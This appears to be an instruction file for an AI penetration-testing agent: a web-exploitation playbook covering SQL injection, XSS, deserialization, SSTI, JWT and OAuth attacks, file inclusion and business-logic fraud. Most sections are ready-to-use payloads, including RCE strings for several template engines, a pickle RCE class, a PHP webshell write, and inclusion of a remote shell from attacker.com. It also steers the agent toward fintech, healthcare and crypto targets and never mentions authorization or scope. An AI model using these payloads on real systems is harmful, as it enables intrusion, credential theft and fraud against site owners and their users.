# Exploitation Approach

## Prioritization
1. **Critical**: RCE, Authentication Bypass, SQL Injection
2. **High**: XSS (Stored), SSRF, XXE, Deserialization
3. **Medium**: XSS (Reflected), CSRF, Information Disclosure
4. **Low**: Missing headers, Minor misconfigurations

## Exploitation Process
1. Verify vulnerability exists (PoC)
2. Understand the vulnerability mechanics
3. Develop working exploit
4. Document with evidence
5. Assess actual impact

## Evidence Collection
- Screenshots of successful exploitation
- Request/response captures
- Commands executed and output
- Files accessed or modified
- Save to artifacts directory

---

# Web Exploitation Techniques

## OWASP Top 10 Focus

### A01: Broken Access Control
- IDOR (Insecure Direct Object Reference)
- Privilege escalation
- Path traversal
- Missing function-level access control

### A02: Cryptographic Failures
- Weak encryption
- Hardcoded secrets
- Insecure key storage

### A03: Injection
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection

### A07: XSS (Cross-Site Scripting)
- Reflected XSS
- Stored XSS
- DOM-based XSS

### A10: SSRF (Server-Side Request Forgery)
- Internal service access
- Cloud metadata endpoints
- Protocol smuggling

---

# Injection Attack Techniques

## SQL Injection

### Injection Context Types
Understanding WHERE injection occurs is critical:

1. **Value Position** (most common) - Input goes into WHERE value
   ```sql
   SELECT * FROM users WHERE id = '$input'
   -- Exploit: ' OR '1'='1'--
   ```

2. **Column/Identifier Position** - Input is used as column name
   ```sql
   SELECT * FROM items ORDER BY `$input`
   -- Standard payloads fail here (wrapped in backticks)
   -- Exploit approaches:
   --   - Subquery: `, (SELECT password FROM users LIMIT 1)--
   --   - IF conditional: `,(IF(1=1,name,id))--
   --   - CASE: `,CASE WHEN 1=1 THEN name ELSE id END--
   ```

3. **Table Position** - Input is table name
   ```sql
   SELECT * FROM `$input` WHERE id = 1
   ```

4. **Second-Order** - Input stored, used later unsafely

### Identify Injection Position
- Test with single quote: error = likely value position
- Test with backtick: error = likely identifier position
- ORDER BY injection: responds to `1`, `2` (column numbers)
- No visible error: try time-based detection

### Automated Testing
```bash
# Value injection (default)
sqlmap -u "http://target/page?id=1" --batch --dbs

# POST parameter
sqlmap -u "http://target/page" --data="id=1" -p id --batch

# With cookies for auth
sqlmap -u "http://target/page?id=1" --cookie="session=abc" --batch

# Higher level for edge cases
sqlmap -u "http://target/page?id=1" --level=5 --risk=3 --batch
```

### Manual Testing Payloads

**Value Position:**
```
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1 OR 1=1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

**Column/ORDER BY Position:**
```
-- Try numbers first
1
2
3
-- Then test for injection
1,(SELECT+1)
name,(SELECT+version())
-- Conditional extraction
IF(1=1,name,id)
CASE WHEN (SELECT 1)=1 THEN name ELSE id END
```

**Time-Based (Universal):**
```
'; WAITFOR DELAY '0:0:5'--     (MSSQL)
' AND SLEEP(5)--               (MySQL)
'; SELECT pg_sleep(5)--        (PostgreSQL)
' AND 1=BENCHMARK(5000000,MD5('a'))--  (MySQL alternative)
```

### When SQLMap Fails
1. **Filtering detected**: Try tamper scripts
   ```bash
   sqlmap -u URL --tamper=space2comment,between
   ```
2. **Identifier position**: SQLMap struggles - use manual testing
3. **WAF blocking**: Reduce rate, use proxies
4. **Stacked queries disabled**: PDO/prepared - try UNION instead

### Pivoting from SQLi
If injection exists but exploitation is blocked:
- Can you read files? `LOAD_FILE('/etc/passwd')`
- Can you write files? `INTO OUTFILE '/var/www/shell.php'`
- Is there another injectable parameter?
- Can you extract credentials for other services?

## Command Injection
```
; ls
| cat /etc/passwd
`id`
$(whoami)
|| whoami
& whoami
%0a whoami
```

## NoSQL Injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

---

# XSS (Cross-Site Scripting) Techniques

## XSS Types and Detection

### Reflected XSS
Input reflected in immediate response. Test by:
1. Inject unique string: `inferno123test`
2. Check if it appears unencoded in response
3. Try breaking out of context

### Stored XSS
Input stored and displayed to other users. Higher impact:
- Comments, profiles, messages, filenames
- Test with benign marker first, then payload

### DOM-based XSS
Client-side JavaScript processes user input unsafely:
- Check sources: `location.hash`, `location.search`, `document.referrer`
- Check sinks: `innerHTML`, `eval()`, `document.write()`

## Context-Aware Payloads

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Attribute Context
```html
" onclick=alert(1) "
' onfocus=alert(1) autofocus '
" onmouseover=alert(1) "
```

### JavaScript Context
```javascript
';alert(1)//
"-alert(1)-"
';alert(1)//
</script><script>alert(1)</script>
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Filter Bypass Techniques

### Tag Blocklist Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case variation -->
<scr<script>ipt>alert(1)</script>   <!-- Nested tags -->
<svg/onload=alert(1)>               <!-- No space needed -->
<img src=x onerror="alert(1)">      <!-- Event handlers -->
```

### Keyword Bypass
```javascript
alert`1`                            // Template literal
alert(1)                       // Unicode escape
window['alert'](1)                  // Bracket notation
top['al'+'ert'](1)                  // String concat
eval(atob('YWxlcnQoMSk='))          // Base64
```

### WAF Bypass
```html
<img src=x onerror=alert(1)>        <!-- Standard -->
<img/src=x onerror=alert(1)>        <!-- Slash instead of space -->
<img src=x onerror=&#97;lert(1)>    <!-- HTML entities -->
<img src=x onerror=alert(1)>   <!-- Unicode -->
```

## Testing Workflow

1. **Identify injection points**: forms, URL params, headers, cookies
2. **Determine context**: HTML, attribute, JS, URL
3. **Test reflection**: Does input appear in response?
4. **Check encoding**: Is special chars encoded?
5. **Craft payload**: Match context, bypass filters
6. **Verify execution**: Check browser console

## Impact Escalation

Once XSS works, escalate:
- Session hijacking: `document.cookie`
- Keylogging: capture form inputs
- Phishing: inject fake login form
- CSRF: trigger actions as victim
- Data exfiltration: read page content

---

# Deserialization Attack Techniques

## Identifying Deserialization

### Common Indicators
- Base64 encoded data in cookies/parameters
- Binary data blobs
- Magic bytes indicating serialized objects

### Language-Specific Signatures

**Java:**
```
rO0AB...           (Base64 Java serialized)
ac ed 00 05        (Hex magic bytes)
Content-Type: application/x-java-serialized-object
```

**PHP:**
```
O:4:"User":2:{s:4:"name";s:5:"admin";}   (PHP serialized)
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}   (PHP array)
```

**Python (Pickle):**
```
gASV...            (Base64 pickle)
\x80\x04\x95    (Pickle protocol 4)
```

**Node.js:**
```
{"rce":"_$$ND_FUNC$$_function(){...}"}   (node-serialize)
```

**.NET:**
```
AAEAAAD/////...    (Base64 BinaryFormatter)
```

## Exploitation by Language

### PHP Object Injection
```php
# If __wakeup() or __destruct() has dangerous code
O:8:"Vuln":1:{s:4:"cmd";s:6:"whoami";}

# POP chains - chain multiple classes
# Use PHPGGC to generate gadget chains:
# phpggc Laravel/RCE1 system 'id' -b
```

### Java Deserialization
```bash
# Use ysoserial to generate payloads
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# Common gadget chains:
# - CommonsCollections1-7
# - Spring1/2
# - Hibernate1/2
# - JRMPClient (for SSRF)
```

### Python Pickle
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit()))
```

### Node.js
```javascript
// node-serialize vulnerability
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
```

## Detection Strategy

1. **Find serialized data**: cookies, hidden fields, APIs
2. **Identify format**: Java, PHP, Python, .NET
3. **Test for reflection**: modify and resend
4. **Test for errors**: corrupt data, check error messages
5. **Generate payload**: use appropriate gadget chain
6. **Verify RCE**: time delay or DNS callback

## Common Vulnerable Components

- **Java**: Apache Commons Collections, Spring Framework
- **PHP**: Laravel, Symfony, Magento
- **Python**: Django (pickled sessions), Flask
- **.NET**: BinaryFormatter, Json.NET with TypeNameHandling

## Mitigation Bypass

If signing is used:
- Check for key disclosure in source/config
- Try known default keys
- Test for signature stripping
- Look for race conditions in validation

---

# SSTI (Server-Side Template Injection)

## Detection Payloads

### Universal Detection
```
{{7*7}}             -> 49 (most engines)
${7*7}              -> 49 (some engines)
<%= 7*7 %>          -> 49 (ERB)
#{7*7}              -> 49 (some engines)
*{7*7}              -> 49 (some engines)
```

### Engine Identification
```
# Jinja2/Twig detection
{{7*'7'}}           -> 7777777 (Jinja2), 49 (Twig)

# Freemarker
${7*7}              -> 49
<#assign x=7*7>${x} -> 49

# Velocity
#set($x=7*7)$x      -> 49

# Smarty
{$smarty.version}   -> version info
{php}echo 'test';{/php}
```

## Exploitation by Engine

### Jinja2 (Python/Flask)
```python
# Read config
{{config}}
{{config.items()}}

# RCE via subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Direct RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Shorter payload
{{lipsum.__globals__.os.popen('id').read()}}
```

### Twig (PHP)
```php
# Info disclosure
{{_self.env.display("id")}}

# RCE (older versions)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### Freemarker (Java)
```java
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# File read
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Velocity (Java)
```java
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")
```

### ERB (Ruby)
```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### Smarty (PHP)
```php
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Detection Workflow

1. **Find input reflection** in rendered pages
2. **Test math expressions**: {{7*7}}, ${7*7}
3. **Identify engine** from behavior differences
4. **Check for sandboxing** and restrictions
5. **Escalate to RCE** using engine-specific payloads

## Bypass Techniques

### Filter Bypass
```python
# Blocked: __class__
{{''|attr('\x5f\x5fclass\x5f\x5f')}}

# Blocked: config
{{self.__dict__._TemplateReference__context.config}}

# Using request object
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Sandbox Escape
- Look for global objects exposed to template
- Chain multiple objects to reach dangerous methods
- Check for debug mode enabling extra features

---

# Authentication Attack Techniques

## Password Attacks
- Default credentials testing (admin:admin, root:root, test:test)
- Credential stuffing with leaked databases
- Password spraying (slow, avoid lockouts)
- Use **hydra** tool for automated attacks

## Session Attacks
- Session fixation: Set victim's session before login
- Session hijacking: Steal via XSS or network sniffing
- Insecure session storage: Check localStorage, sessionStorage
- Predictable session IDs: Analyze for patterns

## JWT (JSON Web Token) Attacks

### JWT Structure
```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

### Algorithm Confusion (CVE-2015-9235)
```python
# Original: RS256 (asymmetric)
# Attack: Change to HS256, sign with public key

import jwt
import base64

# Get public key from /jwks.json or certificate
public_key = open('public.pem').read()

# Forge token using public key as HMAC secret
forged = jwt.encode({'user': 'admin'}, public_key, algorithm='HS256')
```

### None Algorithm
```python
# Remove signature, set alg to "none"
import base64
import json

header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user": "admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
```

### Weak Secret Brute-Force
```bash
# Use hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Use jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Common weak secrets:
# secret, password, 123456, key, jwt_secret
```

### Key Injection (JKU/X5U)
```json
# Header with jku pointing to attacker server
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
# Host malicious JWKS with your keys
```

### Kid Injection
```json
# SQL injection via kid
{"alg": "HS256", "kid": "' UNION SELECT 'secret' --"}

# Path traversal via kid
{"alg": "HS256", "kid": "../../../dev/null"}
```

### JWT Testing Checklist
1. Decode token (jwt.io)
2. Check algorithm (RS256, HS256, none)
3. Test algorithm confusion
4. Test none algorithm
5. Brute-force weak secrets
6. Check for jku/x5u headers
7. Test kid parameter injection
8. Modify payload claims (user, role, exp)

## OAuth/OIDC Vulnerabilities

### Open Redirect
```
# Bypass redirect_uri validation
?redirect_uri=https://legitimate.com.attacker.com
?redirect_uri=https://legitimate.com@attacker.com
?redirect_uri=https://legitimate.com%0d%0a@attacker.com
?redirect_uri=https://attacker.com#legitimate.com
```

### State Parameter Issues
- Missing state: CSRF possible
- Predictable state: Forge authorization
- State not validated: Reuse across sessions

### Token Leakage
- Check Referer header
- Check browser history
- Token in URL fragments
- Token logged in error messages

## Multi-Factor Bypass

### Response Manipulation
```
# Change response from server
{"mfa_required": true}  →  {"mfa_required": false}
{"status": "verify"}    →  {"status": "success"}
```

### Rate Limiting Bypass
- IP rotation
- Add X-Forwarded-For headers
- Slow down requests
- Try from different endpoints

### Backup Code Attacks
- Brute-force (usually 8 digits)
- Social engineering
- Check if codes are predictable

### MFA Fatigue
- Spam push notifications
- User eventually approves

---

# Business Logic Vulnerability Detection

## Common Business Logic Flaws

### Price/Quantity Manipulation
```
Original: quantity=1&price=100
Test: quantity=-1&price=100       (negative quantity)
Test: quantity=1&price=-100       (negative price)
Test: quantity=0.0001&price=100   (fractional quantity)
Test: quantity=99999999           (integer overflow)
```

### Workflow Bypass
```
# Skip steps in multi-step process
Step 1: /checkout/shipping
Step 2: /checkout/payment
Step 3: /checkout/confirm

Try: Go directly to step 3 without steps 1-2
Try: Repeat step with modified data after validation
```

### Race Conditions
```
# Parallel requests to exploit timing windows
# Use race_tester tool for:
- Coupon reuse (apply same code twice)
- Balance manipulation (withdraw twice)
- Vote manipulation (vote multiple times)
- Limit bypass (exceed rate limits)
```

### IDOR Patterns
```
# Horizontal: Access other users' data
/api/users/123/profile  →  /api/users/124/profile

# Vertical: Access admin functions as user
/api/users/me/settings  →  /api/admin/settings

# Use idor_scanner tool for systematic testing
```

## Detection Strategy

### Parameter Tampering
1. Intercept legitimate requests
2. Identify business-critical parameters
3. Test boundary conditions:
   - Negative values
   - Zero values
   - Very large values
   - Decimal values
   - Empty values
   - Type confusion (string vs int)

### State Manipulation
1. Map the application workflow
2. Identify state-dependent operations
3. Test:
   - Skipping steps
   - Repeating steps
   - Modifying state between steps
   - Concurrent state changes

### Trust Boundary Violations
1. Identify client-side controls
2. Test if server validates:
   - Prices calculated client-side
   - Discounts applied client-side
   - Access controls in JavaScript
   - Hidden form fields

## Specific Attack Patterns

### E-commerce
- Price manipulation in cart
- Coupon stacking/reuse
- Shipping cost bypass
- Gift card balance manipulation
- Referral bonus abuse

### Banking/Financial
- Transfer to same account
- Negative amount transfers
- Race condition on balance
- Currency conversion rounding
- Transaction replay

### Authentication
- Password reset token reuse
- Email verification bypass
- 2FA code reuse
- Session fixation after login
- Remember me token theft

### Social Features
- Follow/unfollow race
- Like/vote manipulation
- Private content access
- Invite code abuse
- Referral fraud

## Testing Tips

1. **Think like a fraudster** - What would I exploit for money?
2. **Map trust boundaries** - Where does client trust server?
3. **Test atomicity** - Are operations truly atomic?
4. **Check ordering** - Does sequence matter?
5. **Verify totals** - Are calculations server-side?

---

# Exploitation Pivot Strategies

## When an Attack Vector Fails

Don't keep trying the same approach. After 3 failed attempts:

1. **Document what you learned** from the failure
2. **Analyze why it failed** (filtering, architecture, permissions)
3. **Pivot to alternative vectors**

## Pivot Decision Tree

### SQLi Found But Blocked
```
SQLi exists but exploitation fails?
├── Stacked queries disabled (PDO)
│   └── Try: UNION SELECT, conditional extraction, file read/write
├── Input filtering (quotes/backticks stripped)
│   └── Try: Encoding bypass, alternative syntax, different parameter
├── Column position injection
│   └── Try: ORDER BY numbers, conditional expressions, subqueries
└── WAF blocking
    └── Try: Encoding, case variation, comments, HTTP parameter pollution
```

### RCE Path Exists But Unreachable
```
RCE function exists but can't trigger?
├── Need database write access
│   └── Try: SQLi, default creds, backup files with DB creds
├── Need file write access
│   └── Try: SQLi INTO OUTFILE, upload bypass, log poisoning
├── Need authenticated session
│   └── Try: Session fixation, cookie theft, credential extraction
└── Need specific input
    └── Try: Deserialization, template injection, YAML/XML parsing
```

### Web Attack Blocked
```
Primary web attack fails?
├── Check for other entry points
│   └── API endpoints, admin panels, subdomains, alternate ports
├── Check for information disclosure
│   └── Git dump, backup files, source code, error messages
├── Check for credentials
│   └── Default creds, leaked creds, credential stuffing
└── Check for logic flaws
    └── IDOR, race conditions, business logic bypass
```

## General Pivoting Rules

1. **Never rely on single vector** - Always have backup plans
2. **Use findings from one area in another** - Creds from git → login
3. **Privilege paths vary** - Sometimes low-priv access enables high-priv attack
4. **Time-box attacks** - Set limits, pivot after N failed attempts

## Attack Priority Ladder

When multiple vectors exist, prioritize:

1. **Direct RCE** - Command injection, deserialization, SSTI
2. **File operations** - Upload, LFI to RCE, write to webroot
3. **Database access** - SQLi to dump creds, read/write files
4. **Credential access** - Hash extraction, password in configs
5. **Privilege escalation** - IDOR to admin, session manipulation
6. **Information gathering** - For use in other attacks

## Tool Preference Order

Use built-in tools before writing custom scripts:

1. **http_request** - For all HTTP operations
2. **shell** - For running installed tools (nmap, sqlmap, etc.)
3. **git_dumper** - For .git exposure (auto-analyzes for secrets)
4. **sqlmap** - For SQL injection (structured interface)
5. **Custom Python** - Only when tools don't cover the case

Writing custom scripts wastes budget and may miss features the tools provide.

---

# File-Based Attack Techniques

## Local File Inclusion (LFI)
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=/etc/passwd%00
?file=php://filter/convert.base64-encode/resource=index.php
```

## Remote File Inclusion (RFI)
```
?file=http://attacker.com/shell.txt
?file=\\attacker.com\share\shell.txt
```

## Path Traversal
```
../../../etc/passwd
..\..\..\windows\system32\config\sam
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

## File Upload Attacks
- Extension bypass (php5, phtml, phar)
- MIME type manipulation
- Magic bytes injection
- Null byte injection
- Double extensions
- Case manipulation

## XXE (XML External Entities)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

---

# Advanced Business Logic Testing

## Use the business_logic_tester Tool

The `business_logic_tester` tool provides structured testing for:
- Payment flows and price manipulation
- Workflow state machine testing
- Multi-step process bypass
- Constraint validation testing

### Key Actions

1. **map_flow** - Discover workflow steps
   ```
   business_logic_tester(action='map_flow', base_url='https://target.com', flow_type='checkout')
   ```

2. **test_workflow** - Test for workflow bypass
   ```
   business_logic_tester(action='test_workflow', base_url='...', workflow_template='checkout')
   ```

3. **test_payment** - Test price/quantity manipulation
   ```
   business_logic_tester(action='test_payment', base_url='...', endpoints=['/api/cart', '/api/checkout'])
   ```

4. **test_state** - Test state machine violations
   ```
   business_logic_tester(action='test_state', base_url='...', state_field='order_status')
   ```

## High-Value Business Logic Tests

### Financial Applications
- Negative amount transfers
- Race condition on withdrawals
- Decimal precision exploits
- Currency conversion rounding
- Self-referral bonuses

### E-Commerce
- Price tampering in cart
- Coupon stacking/reuse
- Zero-price checkout
- Negative quantity refunds
- Gift card prediction

### SaaS Platforms
- Subscription tier bypass
- Role escalation via invite
- API key takeover
- Tenant isolation bypass
- Audit log manipulation

## Testing Approach

1. **Map the workflow** - Understand normal flow
2. **Identify state transitions** - What changes between steps
3. **Test out-of-order** - Skip steps, repeat steps
4. **Manipulate parameters** - Prices, quantities, IDs
5. **Race conditions** - Parallel requests on critical operations

---

# Vulnerability Chaining & Auto-Escalation

## Use the exploit_chain Tool

The `exploit_chain` tool automatically identifies escalation opportunities.

### Auto-Escalation

When you find multiple vulnerabilities, use:
```
exploit_chain(action='auto_escalate', findings=[...])
```

This checks known escalation combinations:

### High-Value Chains

| Finding 1 | Finding 2 | Escalates To |
|-----------|-----------|--------------|
| CORS Misconfig | XSS | Account Takeover |
| IDOR | Info Disclosure | Mass Data Breach |
| SSRF | Cloud Metadata | Credential Theft |
| SQLi | File Write | Remote Code Execution |
| Open Redirect | OAuth | Token Theft |
| XXE | SSRF | Internal Network Access |
| CSRF | Admin Function | Full Admin Access |
| JWT Weak Secret | User ID Enum | Mass Impersonation |
| Cache Poisoning | XSS | Persistent Attack |
| SSTI | File Read | Source Code Leak |
| BOLA | PII Fields | GDPR Breach |
| Rate Limit Bypass | Brute Force | Credential Compromise |

### Building Manual Chains

```
exploit_chain(
    action='build_chain',
    starting_vuln='cors_misconfig',
    target_impact='account_takeover'
)
```

### Chain Analysis

```
exploit_chain(
    action='analyze',
    chain_id='...'  # From previous build
)
```

## Chaining Strategy

1. **Document all findings** - Even low-severity ones
2. **Look for combinations** - Use auto_escalate regularly
3. **Think impact** - What can attacker ultimately achieve?
4. **Consider context** - A chain on admin panel vs user area differs

## Examples

### CORS + XSS = ATO
1. Find CORS allowing any origin
2. Find XSS on same domain
3. Chain: XSS steals cookies via CORS-enabled endpoint
4. Result: Full account takeover

### IDOR + Info Disclosure = Data Breach
1. Find IDOR on user endpoint
2. Find sensitive fields in response
3. Chain: Enumerate all users, extract PII
4. Result: Mass data breach, GDPR implications

---

# Second-Order & Stored Attack Testing

## Use the second_order_tester Tool

The `second_order_tester` tool handles stored/delayed injection testing.

### Testing Stored XSS

```
second_order_tester(
    action='inject',
    injection_type='blind_xss',
    target_url='https://target.com/api/profile',
    field='bio',
    callback_url='https://your-callback.com'
)
```

### Testing Second-Order SQLi

```
second_order_tester(
    action='inject',
    injection_type='second_order_sqli',
    target_url='https://target.com/api/user',
    field='display_name'
)

# Later, trigger with:
second_order_tester(
    action='trigger',
    trigger_url='https://target.com/admin/report'
)
```

### Testing Log Injection

```
second_order_tester(
    action='inject',
    injection_type='log_injection',
    target_url='https://target.com/api/login',
    field='username'
)
```

## Second-Order Attack Types

### Blind XSS
- Inject in user inputs that admins view
- Profile fields, support tickets, feedback forms
- Use callback server to detect execution

### Second-Order SQLi
- Inject payload that's stored safely
- Triggered when used in another query
- Common in: usernames, display names, settings

### Log Injection
- Inject into logged fields
- Trigger when logs are viewed/processed
- Can lead to: Admin XSS, log parser RCE

### CSV Injection
- Inject formulas in exported data
- Triggers when file opened in Excel
- Payloads: =cmd|'/C calc'!A0

### SSTI (Stored)
- Template payloads in stored fields
- Trigger when template renders content

## Testing Workflow

1. **Identify storage points** - Where does user input get stored?
2. **Find trigger points** - Where/when is stored data used?
3. **Inject payloads** - With tracking/callback mechanisms
4. **Monitor for triggers** - Check callback server
5. **Validate impact** - Confirm execution context

---

# Stateful Testing & Session Manipulation

## Use the session_manager Tool

The enhanced `session_manager` provides stateful fuzzing capabilities.

### Setting Up Multi-Context Testing

```
# Create authenticated sessions for different roles
session_manager(action='login', context='admin', url='...', login_data={...})
session_manager(action='login', context='user', url='...', login_data={...})
session_manager(action='login', context='guest', url='...', login_data={...})
```

### Stateful Fuzzing

```
# Set baseline response
session_manager(action='baseline', context='user', url='https://target.com/api/profile')

# Fuzz with state tracking
session_manager(
    action='fuzz',
    context='user',
    url='https://target.com/api/profile',
    json_body={"role": "user", "balance": 100},
    fuzz_type='state_manipulation',
    track_state=True
)
```

### State Comparison

```
# Compare states between different contexts
session_manager(action='compare', context='user', compare_context='admin')
```

### View Anomalies

```
# Find state anomalies across all sessions
session_manager(action='anomalies', context='all')
```

## State Tracking Indicators

The tool automatically tracks:
- Balance changes
- Role/permission changes
- Cart totals
- Subscription tiers
- Authentication status

## Anomaly Detection

Automatic alerts for:
- Unexpected balance increases
- Privilege changes
- Role escalation
- New sensitive state values

## Testing Strategy

1. **Establish baselines** - Normal response for each context
2. **Fuzz systematically** - One parameter at a time
3. **Track state changes** - Monitor what changes
4. **Compare contexts** - Same action, different privileges
5. **Look for anomalies** - Privilege leaks, state corruption

---

# Target-Specific Testing Approach

## Use the learning_db Tool for Target Profiles

Get industry-specific testing guidance:

```
# List available profiles
learning_db(action='list_profiles')

# Get detailed profile
learning_db(action='profile', profile_type='fintech')
learning_db(action='profile', profile_type='ecommerce')
learning_db(action='profile', profile_type='saas')
```

### Auto-Match Profile from Endpoints

```
learning_db(
    action='match_profile',
    discovered_endpoints=['/api/cart', '/api/checkout', '/api/orders']
)
```

## Industry-Specific Focus Areas

### Fintech / Banking
- **Priority**: Race conditions, balance manipulation
- **Focus**: /transfer, /withdraw, /payment endpoints
- **Tests**: Negative amounts, decimal precision, concurrent requests

### E-Commerce
- **Priority**: Price manipulation, coupon abuse
- **Focus**: /cart, /checkout, /coupon endpoints
- **Tests**: Price tampering, quantity manipulation, gift card prediction

### SaaS / B2B
- **Priority**: Tenant isolation, privilege escalation
- **Focus**: /organization, /roles, /subscription endpoints
- **Tests**: Role manipulation, cross-tenant access, tier bypass

### Healthcare
- **Priority**: Patient data access, HIPAA compliance
- **Focus**: /patient, /records, /prescriptions endpoints
- **Tests**: IDOR on patient IDs, PHI exposure, consent bypass

### Social Media
- **Priority**: Privacy bypass, content access
- **Focus**: /profile, /messages, /posts endpoints
- **Tests**: Private profile viewing, DM access, block bypass

### Gaming
- **Priority**: Virtual currency, item duplication
- **Focus**: /currency, /inventory, /trade endpoints
- **Tests**: Currency manipulation, trade race conditions, achievement unlock

### Crypto / Web3
- **Priority**: Wallet security, transaction integrity
- **Focus**: /wallet, /withdraw, /swap endpoints
- **Tests**: Withdrawal race, price manipulation, signature replay

## Applying Profiles

1. **Identify target industry** - From recon or endpoint patterns
2. **Load profile** - Get prioritized endpoint list
3. **Focus testing** - Hit high-value endpoints first
4. **Apply business logic tests** - Industry-specific scenarios
5. **Track state indicators** - Monitor relevant values